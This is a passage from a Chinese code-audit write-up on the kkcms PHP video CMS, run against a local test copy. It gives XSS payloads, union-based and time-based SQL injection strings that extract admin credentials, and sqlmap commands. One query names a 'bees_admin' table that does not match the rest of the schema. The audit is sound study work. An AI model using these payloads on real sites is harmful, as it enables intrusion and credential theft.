getPageHtml($page,$fenye,'movie.php?m='.$yourneed.'&amp;page=');?>\n&lt;/ul>\n&lt;/div>\n&lt;/div>\n&lt;/section>\n&lt;?php  include 'footer.php';?>\n存在可控参数$_GET[&#39;m&#39;]和$_GET[&#39;page&#39;]，开头引用了inc.php，试着找一下输出语句。发现输出语句\n&lt;?php echo getPageHtml($page,$fenye,'movie.php?m='.$yourneed.'&amp;page=');?>\n发现被函数getPageHtml包裹了，跟进查看\nfunction getPageHtml($_var_60, $_var_61, $_var_62)\n&#123;\n\t$_var_63 = 5;\n\t$_var_60 = $_var_60 &lt; 1 ? 1 : $_var_60;\n\t$_var_60 = $_var_60 > $_var_61 ? $_var_61 : $_var_60;\n\t$_var_61 = $_var_61 &lt; $_var_60 ? $_var_60 : $_var_61;\n\t$_var_64 = $_var_60 - floor($_var_63 / 2);\n\t$_var_64 = $_var_64 &lt; 1 ? 1 : $_var_64;\n\t$_var_65 = $_var_60 + floor($_var_63 / 2);\n\t$_var_65 = $_var_65 > $_var_61 ? $_var_61 : $_var_65;\n\t$_var_66 = $_var_65 - $_var_64 + 1;\n\tif ($_var_66 &lt; $_var_63 &amp;&amp; $_var_64 > 1) &#123;\n\t\t$_var_64 = $_var_64 - ($_var_63 - $_var_66);\n\t\t$_var_64 = $_var_64 &lt; 1 ? 1 : $_var_64;\n\t\t$_var_66 = $_var_65 - $_var_64 + 1;\n\t&#125;\n\tif ($_var_66 &lt; $_var_63 &amp;&amp; $_var_65 &lt; $_var_61) &#123;\n\t\t$_var_65 = $_var_65 + ($_var_63 - $_var_66);\n\t\t$_var_65 = $_var_65 > $_var_61 ? $_var_61 : $_var_65;\n\t&#125;\n\tif ($_var_60 > 1) &#123;\n\t\t$_var_67 .= '&lt;li>&lt;a  title=\"上一页\" href=\"' . $_var_62 . ($_var_60 - 1) . '\"\">上一页&lt;/a>&lt;/li>';\n\t&#125;\n\tfor ($_var_68 = $_var_64; $_var_68 &lt;= $_var_65; $_var_68++) &#123;\n\t\tif ($_var_68 == $_var_60) &#123;\n\t\t\t$_var_67 .= '&lt;li>&lt;a style=\"background:#FF9900;\">&lt;font color=\"#fff\">' . $_var_68 . '&lt;/font>&lt;/a>&lt;/li>';\n\t\t&#125; else &#123;\n\t\t\t$_var_67 .= '&lt;li>&lt;a href=\"' . $_var_62 . $_var_68 . '\">' . $_var_68 . '&lt;/a>&lt;/li>';\n\t\t&#125;\n\t&#125;\n\tif ($_var_60 &lt; $_var_65) &#123;\n\t\t$_var_67 .= '&lt;li>&lt;a  title=\"下一页\" href=\"' . $_var_62 . ($_var_60 + 1) . '\"\">下一页&lt;/a>&lt;/li>';\n\t&#125;\n\treturn $_var_67;\n&#125;\n跟进查看后也没有发现输出点，结果网页端js代码再看看传参\nhttp://127.0.0.1:8080/kkcms-kkcms/wap/movie.php?m=111\n查看源代码，Ctrl+f搜?m=111查找对应js代码找到js代码\n&lt;li>&lt;a href=\"movie.php?m=111&amp;page=4\">4&lt;/a>&lt;/li>&lt;li>&lt;a href=\"movie.php?m=111&amp;page=5\">5&lt;/a>&lt;/li>&lt;li>&lt;a  title=\"下一页\" href=\"movie.php?m=111&amp;page=2\"\">下一页&lt;/a>&lt;/li>&lt;/ul>\n尝试直接闭合a标签执行xss语句，构造payload如下\n?m=\">&lt;script>alert(111)&lt;/script>\n\n成功触发xss同类XSS文件如下\nwap/tv.php\n其对应输出代码如下\n&lt;?php echo getPageHtml($page,$fenye,'tv.php?m='.$yourneed.'&amp;page=');?>\n\nwap/zongyi.php\n其对应输出代码如下\n&lt;?php echo getPageHtml($page,$fenye,'zongyi.php?m='.$yourneed.'&amp;page=');?>\n\nwap/dongman.php\n其对应输出代码如下\n&lt;?php echo getPageHtml($page,$fenye,'dongman.php?m='.$yourneed.'&amp;page=');?>\n\nsystem/pcon.php(失败)发现这里有个echo 变量的，利用Seay跟进一下这个文件\n&lt;?php\nif ($xtcms_pc==1)&#123;\n?>\n\n&lt;script>\nfunction uaredirect(f)&#123;try&#123;if(document.getElementById(\"bdmark\")!=null)&#123;return&#125;var b=false;if(arguments[1])&#123;var e=window.location.host;var a=window.location.href;if(isSubdomain(arguments[1],e)==1)&#123;f=f+\"/#m/\"+a;b=true&#125;else&#123;if(isSubdomain(arguments[1],e)==2)&#123;f=f+\"/#m/\"+a;b=true&#125;else&#123;f=a;b=false&#125;&#125;&#125;else&#123;b=true&#125;if(b)&#123;var c=window.location.hash;if(!c.match(\"fromapp\"))&#123;if((navigator.userAgent.match(/(iPhone|iPod|Android|ios)/i)))&#123;location.replace(f)&#125;&#125;&#125;&#125;catch(d)&#123;&#125;&#125;function isSubdomain(c,d)&#123;this.getdomain=function(f)&#123;var e=f.indexOf(\"://\");if(e>0)&#123;var h=f.substr(e+3)&#125;else&#123;var h=f&#125;var g=/^www\\./;if(g.test(h))&#123;h=h.substr(4)&#125;return h&#125;;if(c==d)&#123;return 1&#125;else&#123;var c=this.getdomain(c);var b=this.getdomain(d);if(c==b)&#123;return 1&#125;else&#123;c=c.replace(\".\",\"\\\\.\");var a=new RegExp(\"\\\\.\"+c+\"$\");if(b.match(a))&#123;return 2&#125;else&#123;return 0&#125;&#125;&#125;&#125;;\n&lt;/script>\n&lt;?php\nif ($_GET['play']!=\"\")&#123;\n$cc=\"play.php?play=\";\n$dd=\"bplay.php?play=\";\n$yugao=explode('.html',$_GET['play']);\nfor($k=0;$k&lt;count($yugao);$k++)&#123;\nif ($k>0)&#123;\n$tiaourl=$cc.$_GET['play'];\n\t\t&#125;\nelse&#123;\n$tiaourl=$dd.$_GET['play'];\t\n\t\t&#125;\n&#125;\n&#125;\n?>\n&lt;script type=\"text/javascript\">uaredirect(\"&lt;?php echo $xtcms_domain;?>wap/&lt;?php echo $tiaourl;?>\");&lt;/script>\n&lt;?php\t &#125; ?>\n此时发现可控变量play，如果让他变为xss恶意语句，就可能会实现xss，但我们这个时候看一下最上面，发现有一个if语句\nif ($xtcms_pc==1)&#123;\n它这个条件为true后执行的语句，不仔细看的话甚至都找不到结尾处在哪，经过仔细查看后发现在最后这里的话也就是说，我们只有满足了$xtcms_pc==1这个条件，才能够成功的往下执行，进而利用play参数构造xss语句，因此我们此时就需要跟进这个$xtcms_pc变量，全局搜索一下发现变量赋值点，跟进查看简单看一下这里的代码，发现这个结果是从SQL查询处的结果取出的，而SQL语句不存在变量，因此这里的话我们是不可控的，所以这里的话应该是不存在XSS的，G\nadmin/cms_ad.php登录后台后发现有个广告管理界面发现这里可以设置名称和广告内容，尝试在名称处插入xss语句发现此时成功触发了xss语句，那么这里的话应该是直接将广告名称进行了输出，我们查看后端代码，验证一下\n&lt;?php\ninclude('../system/inc.php');\ninclude('cms_check.php');\nerror_reporting(0);\ninclude('model/ad.php');\n?>\n&lt;?php include('inc_header.php') ?>\n&lt;div class=\"tab-pane1\">\n&lt;div class=\"row\">\n&lt;div class=\"col-sm-12\">\n&lt;div class=\"form-group has-feedback\">\n&lt;label for=\"name-w1\">名称&lt;/label>\n&lt;input id=\"l_name\" class=\"form-control\" name=\"title\" type=\"text\" size=\"60\" data-validate=\"required:请填写广告名称\" value=\"\" />\n&lt;span class=\"help-block\">请输入广告名称&lt;/span>\n&lt;/div>\n&lt;/div>\n&lt;/div>\n&lt;div class=\"row\">\n&lt;div class=\"col-sm-12\">\n&lt;div class=\"form-group\">\n&lt;label for=\"ccnumber-w1\">内容&lt;/label>\n&lt;textarea id=\"l_picture\" class=\"form-control\" name=\"pic\" />&lt;/textarea>\n&lt;span class=\"help-block\">请输入广告的内容&amp;lt;a href=\"网址\" target=\"_blank\"&amp;gt;&amp;lt;img src=\"图片地址\" style=\"width:100%\"&amp;gt;&amp;lt;/a&amp;gt;&lt;/span>\n&lt;/div>\n&lt;/div>\n&lt;/div>\n&lt;div class=\"row\">\n&lt;div class=\"form-group col-sm-12\">\n&lt;label for=\"ccmonth-w1\">广告位置&lt;/label>\n&lt;select id=\"catid\" class=\"form-control\" name=\"catid\">\n&lt;?php\n$result = mysql_query('select * from xtcms_adclass');\nwhile($row1 = mysql_fetch_array($result))&#123;\n?>\n&lt;option value=\"&lt;?php echo $row1['id']?>\">&lt;?php echo $row1['name']?>&lt;/option>\n&lt;?php\n&#125;\n?>\n后端名称处代码为\n&lt;input id=\"l_name\" class=\"form-control\" name=\"title\" type=\"text\" size=\"60\" data-validate=\"required:请填写广告名称\" value=\"\" />\n可以发现这里只是限制了长度为60，其他没有什么限制，输出广告内容的代码是\n$result = mysql_query('select * from xtcms_ad order by id desc');\nwhile($row = mysql_fetch_array($result))&#123;\n?>&lt;tr>\n&lt;td>&lt;?php echo $row['id']?>&lt;/td>\n&lt;td>&lt;?php echo $row['title']?>&lt;/td>\n这里的话是取出结果，然后将结果赋值给$row，最后输出了$row[&#39;id&#39;]和$row[&#39;name&#39;]，正如同所说的一样，不存在过滤点，因而导致了XSS的出现而你此时大概看一下代码的话，它的内容也是如此，内容是在加载页面的时候出现的，这个时候我们可以用img来构造一个xss恶意语句此时随便访问首页的一个视频成功触发XSS\nyoulian.php&lt;?php \ninclude('system/inc.php');\nif(isset($_POST['submit']))&#123;\nnull_back('admin','.');\n\tnull_back($_POST['content'],'你的链接及网站名');\n\t$data['userid'] = $_POST['userid'];\n\t$data['content'] =addslashes($_POST['content']);\n\t$data['time'] =date('y-m-d h:i:s',time());\n\t\n\t$str = arrtoinsert($data);\n\t\t$sql = 'insert into xtcms_youlian ('.$str[0].') values ('.$str[1].')';\n设置了addslashes函数防止SQL注入，但并未防止XSS，我们构造payload如下\n&lt;a href=Javascript:alert(1)>xss&lt;/a>\n后端查看就会发现XSS被触发\nadmin/cms_kamilist.php//部分源码\n&lt;?php\ninclude('../system/inc.php');\ninclude('cms_check.php');\nerror_reporting(0);\n\n?>\n&lt;?php include('inc_header.php') ?>\n&lt;select class=\"form-control\" onchange=\"location.href='cms_kamilist.php?c_used='+this.options[this.selectedIndex].value;\">\n&lt;option value=\"\">使用情况&lt;/option>\n&lt;option value=\"1\" >已使用&lt;/option>\t&lt;option value=\"0\">未使用&lt;/option>\t\t\t\t\t\t&lt;/select>\n&lt;input id=\"c_pass\" class=\"form-control\" type=\"text\" name=\"c_number\" placeholder=\"卡密\"/>\n&lt;input id=\"id\" class=\"input\" type=\"hidden\" name=\"id\" value=\"&lt;?php echo $_GET[\"id\"] ?>\"/>\n&lt;input type=\"submit\" id=\"search\" class=\"btn btn-info\" name=\"search\" value=\"查找\" />\n&lt;a class=\"btn btn-info\" href=\"cms_dao.php&lt;?php if (isset($_GET['id'])) &#123; echo '?cpass='.$_GET[\"id\"];&#125;?>\">&lt;span class=\"icon-plus-square\">导出&lt;/span>&lt;/a>\n&lt;/div>\n关注\nvalue=\"&lt;?php echo $_GET[\"id\"] ?>\"\n发现这里参数id没有什么防护，虽然开头涉及了inc.php，但那个是防护SQL注入的，不影响xss。我们这里如果能够闭合语句的话，似乎就可以触发XSS了。payload\nid=\">&lt;script>alert(1)&lt;/script>\n//此时的语句就是 value=\"&lt;?php echo \">&lt;script>alert(1)&lt;/script> ?>\"\n结果如下\nwx_api.phpclass wechatCallbackapiTest\n&#123;\n\tpublic function valid()\n    &#123;\n        $echoStr = $_GET[\"echostr\"];\n        if($this->checkSignature())&#123;\n        \techo $echoStr;\n        \texit;\n        &#125;\n    &#125;\n可以发现这里的参$_GET[&#39;echostr&#39;]不存在防护，在传入后经过一个if语句直接进行了输出，我们跟进一下这个if语句了的checkSignature函数查看一下\nprivate function checkSignature()\n&#123;\n       // you must define TOKEN by yourself\n       if (!defined(\"TOKEN\")) &#123;\n           throw new Exception('TOKEN is not defined!');\n       &#125;\n       \n       $signature = $_GET[\"signature\"];\n       $timestamp = $_GET[\"timestamp\"];\n       $nonce = $_GET[\"nonce\"];\n       \t\t\n\t$token = TOKEN;\n\t$tmpArr = array($token, $timestamp, $nonce);\n       // use SORT_STRING rule\n\tsort($tmpArr, SORT_STRING);\n\t$tmpStr = implode( $tmpArr );\n\t$tmpStr = sha1( $tmpStr );\n\t\n\tif( $tmpStr == $signature )&#123;\n\t\treturn true;\n\t&#125;else&#123;\n\t\treturn false;\n\t&#125;\n&#125;\n发现这里大概是个检验token的，传个空对应的md5值应该就可以，尝试xsspayload\n?echostr=&lt;script>alert('别当舔狗')&lt;/script>&amp;signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\n\n\nSQLbplay.php&lt;?php \ninclude('system/inc.php');//载入全局配置文件\nerror_reporting(0);//关闭错误报告\n$result = mysql_query('select * from xtcms_vod where d_id = '.$_GET['play'].' ');\nif (!!$row = mysql_fetch_array($result)) &#123;\n\t$d_id = $row['d_id'];\n\t$d_name = $row['d_name'];\n\t$d_jifen = $row['d_jifen'];\n\t$d_user = $row['d_user'];\n\t$d_parent = $row['d_parent'];\n\t$d_picture = $row['d_picture'];\n\t$d_content = $row['d_content'];\n\t$d_scontent = $row['d_scontent'];\n\t$d_seoname = $row['d_seoname'];\n\t$d_keywords = $row['d_keywords'];\n\t$d_description = $row['d_description'];\n\t$d_player = $row['d_player'];\n\t$d_title = ($d_seoname == '') ? $d_name .' - '.$xtcms_name : $d_seoname.' - '.$d_name.' - '.$xtcms_name ;\n&#125; else &#123;\n\tdie ('您访问的详情不存在');\n&#125;\n$result1 = mysql_query('select * from xtcms_vod_class where c_id='.$d_parent.' order by c_id asc');\nwhile ($row1 = mysql_fetch_array($result1))&#123;\n$c_hide=$row1['c_hide'];\n&#125;\nif($c_hide>0)&#123;\nif(!isset($_SESSION['user_name']))&#123;\n\t\talert_href('请注册会员登录后观看',''.$xtcms_domain.'ucenter');\n\t&#125;;\n    $result = mysql_query('select * from xtcms_user where u_name=\"'.$_SESSION['user_name'].'\"');//查询会员积分\n     if($row = mysql_fetch_array($result))&#123;\n\t $u_group=$row['u_group'];//到期时间\n     &#125;\n if($u_group&lt;=1)&#123;//如果会员组\n alert_href('对不起,您不能观看会员视频，请升级会员！',''.$xtcms_domain.'ucenter/mingxi.php');\n &#125; \n&#125;\ninclude('system/shoufei.php');\nif($d_jifen>0)&#123;//积分大于0,普通会员收费\n\tif(!isset($_SESSION['user_name']))&#123;\n\t\talert_href('请注册会员登录后观看',''.$xtcms_domain.'ucenter');\n\t&#125;;\n    $result = mysql_query('select * from xtcms_user where u_name=\"'.$_SESSION['user_name'].'\"');//查询会员积分\n     if($row = mysql_fetch_array($result))&#123;\n     $u_points=$row['u_points'];//会员积分\n     $u_plays=$row['u_plays'];//会员观看记录\n     $u_end=$row['u_end'];//到期时间\n\t $u_group=$row['u_group'];//到期时间\n     &#125;\t\n\n\t     if($u_group&lt;=1)&#123;//如果会员组\n     if($d_jifen>$u_points)&#123;\n\t alert_href('对不起,您的积分不够，无法观看收费数据，请推荐本站给您的好友、赚取更多积分',''.$xtcms_domain.'ucenter/yaoqing.php');\n    &#125;  else&#123;\n\n    if (strpos(\",\".$u_plays,$d_id) > 0)&#123; \n\n\t&#125;\t\n\t//有观看记录不扣点\nelse&#123;\n\n   $uplays = \",\".$u_plays.$d_id;\n   $uplays = str_replace(\",,\",\",\",$uplays);\n   $_data['u_points'] =$u_points-$d_jifen;\n   $_data['u_plays'] =$uplays;\n   $sql = 'update xtcms_user set '.arrtoupdate($_data).' where u_name=\"'.$_SESSION['user_name'].'\"';\nif (mysql_query($sql)) &#123;\n\nalert_href('您成功支付'.$d_jifen.'积分,请重新打开视频观看!',''.$xtcms_domain.'bplay.php?play='.$d_id.'');\n&#125;\n&#125;\n\t\n&#125;\n&#125;\n&#125;\nif($d_user>0)&#123;\t\nif(!isset($_SESSION['user_name']))&#123;\n\t\talert_href('请注册会员登录后观看',''.$xtcms_domain.'ucenter');\n\t&#125;;\n    $result = mysql_query('select * from xtcms_user where u_name=\"'.$_SESSION['user_name'].'\"');//查询会员积分\n     if($row = mysql_fetch_array($result))&#123;\n     $u_points=$row['u_points'];//会员积分\n     $u_plays=$row['u_plays'];//会员观看记录\n     $u_end=$row['u_end'];//到期时间\n\t $u_group=$row['u_group'];//到期时间\n     &#125;\t\t \nif($u_group&lt;$d_user)&#123;\n\talert_href('您的会员组不支持观看此视频!',''.$xtcms_domain.'ucenter/mingxi.php');\n&#125;\n&#125;\nfunction get_play($t0)&#123;\n\t$result = mysql_query('select * from xtcms_player where id ='.$t0.'');\n\tif (!!$row = mysql_fetch_array($result))&#123;\nreturn $row['n_url'];\n\t&#125;else&#123;\n\t\treturn $t0;\n\t&#125;;\n&#125;\n$result = mysql_query('select * from xtcms_vod where d_id ='.$d_id.'');\n\tif (!!$row = mysql_fetch_array($result))&#123;\n$d_scontent=explode(\"\\r\\n\",$row['d_scontent']);\n//print_r($d_scontent);\nfor($i=0;$i&lt;count($d_scontent);$i++)\n&#123;\t$d_scontent[$i]=explode('$',$d_scontent[$i]);\n\t\t&#125;\n$playdizhi=get_play($row['d_player']).$d_scontent[0][1];\n\t&#125;else&#123;\n\t\treturn '';\n\t&#125;;\n\t\ninclude('template/'.$xtcms_bdyun.'/bplay.php');\n?>\n这里的话可以看出主要的SQL语句是这句话\n$result = mysql_query('select * from xtcms_vod where d_id = '.$_GET['play'].' ');\n然后这个play参数是GET传参的，同时看这里的代码可以看出它是没有单引号或者双引号包裹的，此时我们跟进一下include的文件,也就是system/inc.php，查看一下这个文件\n跟进这个library.php\n&lt;?php\n//展示的只是一部分\nif (!defined('PCFINAL')) &#123;\n\texit('Request Error!');\n&#125;\nif (!get_magic_quotes_gpc()) &#123;\n\tif (!empty($_GET)) &#123;\n\t\t$_GET = addslashes_deep($_GET);\n\t&#125;\n\tif (!empty($_POST)) &#123;\n\t\t$_POST = addslashes_deep($_POST);\n\t&#125;\n\t$_COOKIE = addslashes_deep($_COOKIE);\n\t$_REQUEST = addslashes_deep($_REQUEST);\n&#125;\n可以发现这里的话对传入的参数都进行了特殊字符转义，防止SQL注入但事实上我们那个参数未被单引号或者双引号包裹，这也就意味着这里的防护其实是无意义的，因此我们这里的话我们也就可以尝试去进行SQL注入首先我们试着去检测一下字段数，payload如下所示\nplay=1 order by 17  //回显正常\nplay=1 order by 18  //回显错误\n\n这里的话也就可以发现字段数为17了，接下来就可以进去联合查询了，首先我们需要去找一下回显位\nplay=-1 union select 1,2,3,0,0,6,7,8,9,10,11,12,13,14,15,16,17\n\n可以发现回显位是2和9，我们这个时候就可以去读取数据库、数据表这些了，payload如下\n//查库\nplay=-1 union select 1,2,3,0,0,6,7,8,database(),10,11,12,13,14,15,16, 17\n//查表\nplay=-1 union select 1,2,3,0,0,6,7,8,(select group_concat(table_name) from information_schema.tables where table_schema=database()),10,11,12,13,14,15,16, 17\n//查列\nplay=-1 union select 1,2,3,0,0,6,7,8,(select group_concat(column_name) from information_schema.columns where table_name=0x626565735f61646d696e),10,11,12,13,14,15,16, 17//之所以用十六进制是因为这里的单引号会被转义\n//查字段\nplay=-1 union select 1,2,3,0,0,6,7,8,(select group_concat(admin_name,0x7e,admin_password) from bees_admin),10,11,12,13,14,15,16, 17\n\nwap/user.php（失败）结合Seay\n&lt;?php include('../system/inc.php');\nerror_reporting(0);\n$op=$_GET['op'];\nif(!isset($_SESSION['user_name']))&#123;\n\t\talert_href('请登陆后进入','login.php?op=login');\n\t&#125;;\n\t//退出\nif ($op == 'out')&#123;\t\nunset($_SESSION['user_name']);\nunset($_SESSION['user_group']);\nif (! empty ( $_COOKIE ['user_name'] ) || ! empty ( $_COOKIE ['user_password'] ))   \n    &#123;  \n        setcookie ( \"user_name\", null, time () - 3600 * 24 * 365 );  \n        setcookie ( \"user_password\", null, time () - 3600 * 24 * 365 );  \n    &#125;  \nheader('location:login.php?op=login');\n&#125;\n//支付\nif ( isset($_POST['paysave']) ) &#123;\nif ($_POST['pay']==1)&#123;\n\n//判定会员组别\n$result = mysql_query('select * from xtcms_user where u_name=\"'.$_SESSION['user_name'].'\"');\nif($row = mysql_fetch_array($result))&#123;\n\n$u_points=$row['u_points'];\n$u_group=$row['u_group'];\n$send = $row['u_end'];\n\n//获取会员卡信息\n$card= mysql_query('select * from xtcms_userka where id=\"'.$_POST['cardid'].'\"');\nif($row2 = mysql_fetch_array($card))&#123;\n$day=$row2['day'];//天数\n$userid=$row2['userid'];//会员组\n$jifen=$row2['jifen'];//积分\n&#125;\n//判定会员组\nif ($row['u_group']>$userid)&#123; \nalert_href('您现在所属会员组的权限制大于等于目标会员组权限值，不需要升级!','mingxi.php');\n&#125;\n看这一处代码\n$card= mysql_query('select * from xtcms_userka where id=\"'.$_POST['cardid'].'\"');\n不难发现这里的Select语句中的参数被双引号包裹了，而开头包含了inc.php文件，之前就已经查看过，这个文件包含了四个文件，其中一个文件中有addslashes_deep函数，对传入的参数中的特殊字符(如&#39;,&quot;,\\)进行了转义，因此我们这里的话无法通过闭合双引号达到SQL注入的目的，同文件的其他SQL注入处也是如此，这里不再展示\nwap/login.php扫出login.php中存在多个可控变量，我们使用Seay来看一下具体代码\n//展示的仅为一部分\n&lt;?php include('../system/inc.php');\n$op=$_GET['op'];\n\nif(isset($_POST['submit']))&#123;\n\tnull_back($_POST['u_name'],'请输入用户名');\n\tnull_back($_POST['u_password'],'请输入密码');\n\t$u_name = $_POST['u_name'];\n\t$u_password = $_POST['u_password'];\n\t$sql = 'select * from xtcms_user where u_name = \"'.$u_name.'\" and u_password = \"'.md5($u_password).'\" and u_status=1';\n\t$result = mysql_query($sql);\n\tif(!! $row = mysql_fetch_array($result))&#123;\n\t\t\n\t$_data['u_loginnum'] = $row['u_loginnum']+1; \n\t$_data['u_loginip'] =$_SERVER[\"REMOTE_ADDR\"]; \n\t$_data['u_logintime'] =date('y-m-d h:i:s',time());\n\tif(!empty($row['u_end'])) $u_end= $row['u_end'];\n\tif(time()>$u_end)&#123;\n\t$_data['u_flag'] ==\"0\";\n\t$_data['u_start'] ==\"\";\n\t$_data['u_end'] ==\"\";\n\t$_data['u_group'] =1;\n\t&#125;else&#123;\n\t$_data['u_flag'] ==$row[\"u_flag\"];\n\t$_data['u_start'] ==$row[\"u_start\"];\n\t$_data['u_end'] ==$row[\"u_end\"];\n\t$_data['u_group'] =$row[\"u_group\"];\n\t&#125;\n\tmysql_query('update xtcms_user set '.arrtoupdate($_data).' where u_id =\"'.$row['u_id'].'\"');\n\t$_SESSION['user_name']=$row['u_name'];\n\t$_SESSION['user_group']=$row['u_group'];\n\tif($_POST['brand1'])&#123; \nsetcookie('user_name',$row['u_name'],time()+3600 * 24 * 365); \nsetcookie('user_password',$row['u_password'],time()+3600 * 24 * 365); \n&#125; \n\t\theader('location:user.php');\n\t&#125;else&#123;\n\t\talert_href('用户名或密码错误或者尚未激活','login.php?op=login');\n\t&#125;\n&#125;\nif(isset($_POST['reg']))&#123;\n$username = stripslashes(trim($_POST['name']));\n// 检测用户名是否存在\n$query = mysql_query(\"select u_id from xtcms_user where u_name='$username'\");\nif(mysql_fetch_array($query))&#123;\necho '&lt;script>alert(\"用户名已存在，请换个其他的用户名\");window.history.go(-1);&lt;/script>';\nexit;\n&#125;\n$result = mysql_query('select * from xtcms_user where u_email = \"'.$_POST['email'].'\"');\nif(mysql_fetch_array($result))&#123;\necho '&lt;script>alert(\"邮箱已存在，请换个其他的邮箱\");window.history.go(-1);&lt;/script>';\nexit;\n&#125;\n$password = md5(trim($_POST['password']));\n$email = trim($_POST['email']);\n$regtime = time();\n$token = md5($username.$password.$regtime); //创建用于激活识别码\n$token_exptime = time()+60*60*24;//过期时间为24小时后\n$data['u_name'] = $username;\n$data['u_password'] =$password;\n$data['u_email'] = $email;\n$data['u_regtime'] =$regtime;\nif($xtcms_mail==1)&#123;\n$data['u_status'] =0;\n\t&#125;else&#123;\n$data['u_status'] =1;\n\t&#125;\n$data['u_group'] =1;\n$data['u_fav'] =0;\n$data['u_plays'] =0;\n$data['u_downs'] =0;\n//推广注册\nif (isset($_GET['tg'])) &#123;\n\t$data['u_qid'] =$_GET['tg'];\n\t$result = mysql_query('select * from xtcms_user where u_id=\"'.$_GET['tg'].'\"');\nif($row = mysql_fetch_array($result))&#123;\n\n$u_points=$row['u_points'];\n&#125;\n不难发现这里的SELECT语句有以下几个\n$sql = 'select * from xtcms_user where u_name = \"'.$u_name.'\" and u_password = \"'.md5($u_password).'\" and u_status=1';\n$query = mysql_query(\"select u_id from xtcms_user where u_name='$username'\");\n$result = mysql_query('select * from xtcms_user where u_email = \"'.$_POST['email'].'\"');\n$result = mysql_query('select * from xtcms_user where u_id=\"'.$_GET['tg'].'\"');\n但文件开头就声明包含了inc.php文件，说明这里的话包含了过滤函数，也就是对SQL注入是有防护的，对&#39;、&quot;以及\\都进行了转义，因此这里如果参数是被单引号或者双引号包裹的话，那么这里极有可能算是G了，我们看第一个，也就是\n$sql = 'select * from xtcms_user where u_name = \"'.$u_name.'\" and u_password = \"'.md5($u_password).'\" and u_status=1';\n它这个不难发现，$u_name和$u_password都被双引号包裹了，因此这里就不存在SQL注入了。但是看一下第二个，第二个的username参数虽然是被双引号进行包裹了，但你会发现这个参数的传值方式是$username = stripslashes(trim($_POST[&#39;name&#39;]));，这个stripslashes的功能是消除由addslashes函数增加的反斜杠，一个增加一个消除，那这里不就跟没有设置过滤一样吗，因此这个name参数是存在SQL注入的，我们通过BurpSuite进行抓包然后将内容复制到一个txt文件中我这里保存在sqlmap目录下而后打开sqlmap，输入如下payload即可\npython sqlmap.py \"D:/sqlmap/2.txt\" --dbs --batch\n\n可以看到存在延时注入，成功爆破出数据库\nvlist.php在这个界面，用单引号测试一下发现跟正常界面有所不同看一下后端代码\n&lt;?php\nif ($_GET['cid'] != 0)&#123;\n\t?>\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t  &lt;?php\n$result = mysql_query('select * from xtcms_vod_class where c_pid='.$_GET['cid'].' order by c_sort desc,c_id asc');\nwhile ($row = mysql_fetch_array($result))&#123;\n\n\t\t\techo '&lt;a href=\"./vlist.php?cid='.$row['c_id'].'\" class=\"acat\" style=\"white-space: pre-wrap;margin-bottom: 4px;\">'.$row['c_name'].'&lt;/a>';\n\t\t&#125;\n?>\n这里简单看一下的话，不难发现这里的参数cid是不存在任何防护的，即没有被单引号或者双引号包裹，因此这里开头引用的inc.php虽然对SQL注入进行了防护，但在这里其实是没有意义的，用SQLmap跑一下\npython sqlmap.py -u http://127.0.0.1:8080/kkcms-kkcms/vlist.php?cid=1 --dbs --batch\n\n后端文件扫出多个后端文件存在SQL注入，接下来逐一进行检测\nadmin/cms_admin_edit.php源码如下\n//部分代码\n&lt;?php\ninclude('../system/inc.php');\ninclude('cms_check.php');\nerror_reporting(0);\ninclude('model/admin_edit.php');\n?>\n&lt;?php\n$result = mysql_query('select * from xtcms_manager where m_id = '.$_GET['id'].'');\nif($row = mysql_fetch_array($result))&#123;\n?>\n这里的话重点关注肯定是SQL语句，也就是这句话\n$result = mysql_query('select * from xtcms_manager where m_id = '.$_GET['id'].'');\n发现id是无引号包裹的，这意味着这里是存在SQL注入的，我们去验证一下\nid=1 \n\nid=1 and sleep(5)\n\n\n发现两者回显时间不同，说明存在SQL注入，具体为时间盲注，这里就可以编写Python脚本来爆破数据库信息，也可以通过SQLmap，这里不再展示\nadmin/cms_login.php&lt;?php\nrequire_once('../system/inc.php');\nif(isset($_POST['submit']))&#123;\n    if ($_SESSION['verifycode'] != $_POST['verifycode']) &#123;\n        alert_href('验证码错误','cms_login.php');\n    &#125;\n    null_back($_POST['a_name'],'请输入用户名');\n    null_back($_POST['a_password'],'请输入密码');\n    null_back($_POST['verifycode'],'请输入验证码');\n    $a_name = $_POST['a_name'];\n    $a_password = $_POST['a_password'];\n    $sql = 'select * from xtcms_manager where m_name = \"'.$a_name.'\" and m_password = \"'.md5($a_password).'\"';\n    $result = mysql_query($sql);\n这里的话就是发现这个可控参数都被双引号包裹了，然后文件开头包含了inc.php，意味着存在对SQL注入的防护，因此这里的话是无法实现SQL注入的，转战下一处。\nadmin/cms_user_edit.php//部分代码\n&lt;?php\ninclude('../system/inc.php');\ninclude('cms_check.php');\nerror_reporting(0);\ninclude('model/user_edit.php');\n?>\n&lt;?php\n$result = mysql_query('select * from xtcms_user where u_id = '.$_GET['id'].'');\nif($row = mysql_fetch_array($result))&#123;\n?>\n一眼顶真，无包裹方式，存在SQL注入\nid = 16 and sleep(5)\n具体不再演示，此类的我将其列在一起，具体如下所示\nadmin/cms_nav_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_nav where id = '.$_GET['id'].'');\n\nadmin/cms_detail_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_vod where d_id = '.$_GET['id'].'');\n\nadmin/cms_channel_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_vod_class where c_id = '.$_GET['id']);\n\nadmin/cms_check_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_book where id = '.$_GET['id'].'');\n\nadmin/cms_player_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_player where id = '.$_GET['id'].'');\n\nadmin/cms_slideshow_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_slideshow where id = '.$_GET['id'].' ');\n\nadmin/cms_ad_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_ad where id = '.$_GET['id'].' ');\n\nadmin/cms_link_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_link where l_id = '.$_GET['l_id'].'');\n\nadmin/cms_usercard_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_userka where id = '.$_GET['id'].'');\n\nadmin/cms_youlian_edit.php\n其SQL语句如下\n$result = mysql_query('select * from xtcms_youlian where id = 